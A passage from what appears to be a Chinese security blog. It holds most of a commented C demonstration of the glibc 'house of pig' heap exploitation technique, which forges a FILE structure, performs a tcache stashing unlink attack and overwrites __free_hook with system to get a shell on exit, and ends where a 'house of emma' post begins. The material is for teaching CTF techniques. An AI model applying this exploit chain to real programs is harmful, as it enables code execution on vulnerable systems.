class="line"></span><br><span class="line">    <span class="type">size_t</span>* _IO_list_all = (<span class="type">size_t</span>*)(libc_base + <span class="number">0x1ED5A0</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;_IO_list_all中原本保存的应该是_IO_2_1_stderr_这个文件结构体实例。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在程序调用exit函数时会对_IO_list_all中的FILE结构体依次进行遍历。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;exit函数的调用链为：exit-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面是_IO_flush_all_lockp的函数定义：\n\n&quot;</span>);</span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/genops.c， line 684)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;int\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_flush_all_lockp (int do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int result = 0;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  FILE *fp;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#ifdef _IO_MTSAFE_IO\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_cleanup_region_start_noarg (flush_cleanup);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_lock_lock (list_all_lock);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#endif\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  \033[1;31mfor (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      run_fp = fp;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t_IO_flockfile (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t   || (_IO_vtable_offset (fp) == 0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\t    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t   )\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tresult = EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t_IO_funlockfile (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      run_fp = NULL;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#ifdef _IO_MTSAFE_IO\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_lock_unlock (list_all_lock);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_cleanup_region_end (0);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#endif\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  return result;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;注意红色部分的代码，这便是遍历_IO_list_all链中的所有FILE实例。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;其中一条if语句的判断条件中会调用_IO_OVERFLOW函数。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这个函数指的是vtable中overflow那个字段对应的函数。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;要执行到这个函数，就必须要让前面一个判断条件满足。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这也就是我们伪造FILE结构体时需要注意的地方。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面我们就来修改_IO_list_all的值，用一个chunk地址填充。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> chunk_2 = (<span class="type">size_t</span>) <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0xF0</span>) - <span class="number">0x10</span>;</span><br><span class="line">    <span class="comment">// ---------- 第二处漏洞利用 ---------- //</span></span><br><span class="line">    *_IO_list_all = chunk_2;</span><br><span class="line">    <span class="comment">// --------------------------------- //</span></span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;这个chunk的起始地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> HIGHLIGHT <span class="string">&quot;;&quot;</span> YELLOW <span class="string">&quot;m%#zx\n&quot;</span> STR_END, chunk_2);</span><br><span class="line"></span><br><span class="line">    printf_color(RED, HIGHLIGHT, <span class="string">&quot;第四步：伪造FILE结构体。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;我们使用第二次分配到的chunk作为假FILE结构体进行构造。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;再次强调注意_IO_flush_all_lockp函数的限定条件。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;if语句的前一个判断条件是两个判断相或，我们只需要满足第一个判断即可：\n&quot;</span>);</span><br><span class="line">    printf_color(RED, HIGHLIGHT, <span class="string">&quot;fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;其中_mode字段的偏移为0xC0，_IO_write_ptr为0x28，_IO_write_base为0x30。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;我们在_mode处填0，在_IO_write_ptr填1，在_IO_write_base填0就可以了。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* fake_FILE = (<span class="type">size_t</span>*) chunk_2;</span><br><span class="line">    fake_FILE[<span class="number">0xC0</span> / <span class="number">8</span>] = <span class="number">0</span>;    <span class="comment">// _mode</span></span><br><span class="line">    fake_FILE[<span class="number">0x20</span> / <span class="number">8</span>] = <span class="number">1</span>;</span><br><span class="line">    fake_FILE[<span class="number">0x28</span> / <span class="number">8</span>] = <span class="number">0xFFFFFFFFFFFF</span>;    <span class="comment">// _IO_write_ptr</span></span><br><span class="line">    fake_FILE[<span class="number">0x30</span> / <span class="number">8</span>] = <span class="number">0</span>;    <span class="comment">// _IO_write_base</span></span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;三个字段修改完成。但我们需要修改的可不止这三个字段。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在这个判断条件通过后，我们将会进入overflow函数。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;house of pig的一个重要思想就是让其执行_IO_str_overflow函数。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这需要我们在vtable中写入_IO_str_jumps的地址，其中保存有这个函数的地址。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;看一下IDA中的_IO_str_jumps结构体：\n\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9560 qword_1E9560    dq 0                    ; DATA XREF: sub_52C20+49A↑o\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9560                                         ; sscanf+B5↑o ...\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9568                 dq 0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9570                 dq offset sub_93D50\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\033[1;31m__libc_IO_vtables:00000000001E9578                 dq offset _IO_str_overflow\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9580                 dq offset _IO_str_underflow\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9588                 dq offset _IO_default_uflow\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9590                 dq offset _IO_str_pbackfail\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9598                 dq offset _IO_default_xsputn\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95A0                 dq offset _IO_default_xsgetn\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95A8                 dq offset _IO_str_seekoff\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95B0                 dq offset sub_92600\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95B8                 dq offset sub_924E0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95C0                 dq offset sub_92870\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95C8                 dq offset _IO_default_doallocate\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95D0                 dq offset sub_937F0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95D8                 dq offset sub_93800\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95E0                 dq offset sub_937D0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95E8                 dq offset sub_92870\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95F0                 dq offset sub_937E0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95F8                 dq offset sub_93810\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9600                 dq offset sub_93820\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;其偏移为0x1E9560。将其填充到vtable字段，偏移为0xD8。\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> _IO_str_jumps = libc_base + <span class="number">0x1E9560</span>;</span><br><span class="line">    fake_FILE[<span class="number">0xD8</span> / <span class="number">8</span>] = _IO_str_jumps;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;然后，我们进入_IO_str_overflow函数看看。\n\n&quot;</span>);</span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/strops.c, line 80)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;int\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_str_overflow (FILE *fp, int c)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int flush_only = c == EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  size_t pos;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (fp-&gt;_flags &amp; _IO_NO_WRITES)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      return flush_only ? 0 : EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      else\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\033[1;31m\t  char *new_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  char *old_buf = fp-&gt;_IO_buf_base;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  size_t old_blen = _IO_blen (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  size_t new_size = 2 * old_blen + 100;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  if (new_size &lt; old_blen)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    return EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  new_buf = malloc (new_size);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  if (new_buf == NULL)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      /*\t  __ferror(fp) = 1; */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      return EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  if (old_buf)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      memcpy (new_buf, old_buf, old_blen);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      free (old_buf);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      /* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      fp-&gt;_IO_buf_base = NULL;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    &#125;\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  memset (new_buf + old_blen, &#x27;\\0&#x27;, new_size - old_blen);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  _IO_setb (fp, new_buf, new_buf + new_size, 1);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_write_base = new_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (!flush_only)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    *fp-&gt;_IO_write_ptr++ = (unsigned char) c;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (flush_only)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    return 0;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  else\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    return c;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;注意红色部分的代码，这里会连续调用malloc、memcpy、free函数。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;house of pig想要在这里大做文章。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;首先需要通过tcache stashing unlink attack或其他方法向tcache中插入__free_hook附近的地址。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;然后在运行到此时，首先通过malloc分配出来，然后memcpy将指定位置的内容复制到__free_hook。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;最后通过free函数执行__free_hook中的内容，这里将__free_hook修改为system函数地址。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;通过代码我们可以知道，memcpy是将_IO_buf_base（结构体内偏移0x38）地址处的内容复制到__free_hook。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;而这个复制的原地址是我们可控的，需要我们在伪造的FILE结构体中设置。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这里我们设置这个地址的值为第一个chunk的地址+0x20。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;............\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_FILE[<span class="number">0x38</span> / <span class="number">8</span>] = chunk_1 + <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;设置完成。之后我们需要注意malloc函数申请的chunk大小，其申请的大小需要经过计算。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;计算方式是：(_IO_buf_end - _IO_buf_base) * 2 + 100。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这要求我们正确设置_IO_buf_end的值。如果使用0x100的tcache进行攻击，则end-base=0x46。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;据此设置_IO_buf_end为第一个chunk的地址+0x20+0x46（结构体内偏移0x40）。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;............\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_FILE[<span class="number">0x40</span> / <span class="number">8</span>] = chunk_1 + <span class="number">0x20</span> + <span class="number">0x46</span>;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;设置完成。最后注意free函数的参数是FILE结构体的起始地址，因此在第二个chunk+0x20处写入\&quot;/bin/sh\\x00\&quot;。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;另外在第二个chunk+0x30处写入system函数地址，memcpy函数能够将这里的地址复制到__free_hook。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span>*)(chunk_1 + <span class="number">0x20</span>), <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)(chunk_1 + <span class="number">0x20</span> + <span class="number">0x10</span>) = (<span class="type">size_t</span>)system;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;............\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;设置完成。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(RED, HIGHLIGHT, <span class="string">&quot;第五步：通过tcache stashing unlink attack在tcache写入__free_hook附近地址。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;当赛题中只使用calloc时，只有在tcache中存放堆地址，才能让malloc分配到__free_hook。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面进行这种攻击的常规流程：\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;首先分配9个chunk并释放，7个到tcache，2个到small bins。然后分配两个tcache chunk出来。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* chunks[<span class="number">9</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)</span><br><span class="line">        chunks[i] = <span class="built_in">malloc</span>(<span class="number">0xF0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);   <span class="comment">// to avoid consolidate</span></span><br><span class="line">    chunks[<span class="number">7</span>] = <span class="built_in">malloc</span>(<span class="number">0xF0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);   <span class="comment">// to avoid consolidate</span></span><br><span class="line">    chunks[<span class="number">8</span>] = <span class="built_in">malloc</span>(<span class="number">0xF0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);   <span class="comment">// to avoid consolidate</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">9</span>; i++)</span><br><span class="line">        <span class="built_in">free</span>(chunks[i]);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xF0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xF0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;依次释放9个chunk，tcache中的chunk应该为：7-&gt;6-&gt;5-&gt;4-&gt;3-&gt;2-&gt;1。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;unsorted bin中的chunk应该为：9&lt;-&gt;8。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;然后分配出来两个tcache chunk，再分配一个较大的chunk，让unsorted bin的两个chunk进入small bins。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;应该修改第9个chunk的bk指针为__free_hook附近地址。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;............\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">size_t</span>*)((<span class="type">size_t</span>)(chunks[<span class="number">8</span>]) + <span class="number">0x8</span>) = __free_hook - <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;修改完成，之后分配一个出来进行攻击。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0xF0</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;已经分配出来了一个chunk，现在0x100的tcache中的第一个chunk就是__free_hook附近的地址。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(RED, HIGHLIGHT, <span class="string">&quot;第六步：调用exit函数触发house of pig漏洞。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;现在，所有的东西都已经布置好了，只需要一个exit函数，我们就能够执行预期的函数调用链并getshell。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>glibc 2.35 pwn——house of emma示例程序</title>
      <link href="/2023/02/28/glibc-2-35-pwn%E2%80%94%E2%80%94house-of-emma%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F/"/>
      <url>/2023/02/28/glibc-2-35-pwn%E2%80%94%E2%80%94house-of-emma%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p>这是笔者写的house of emma示例程序，需要在ubuntu 22.04上编译运行，可以选择orw模式和getshell模式两种利用方式，每一步都有详细的解释，所有说明文字均使用不同颜色注明与高亮。请读者自取学习。如果需要进行调试，可以在需要调试的代码段插入sleep函数，然后就可以断在那里了。</p><p>若程序在运行过程中出现任何非预期情况，请及时与笔者联系，以便及时进行修改。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span 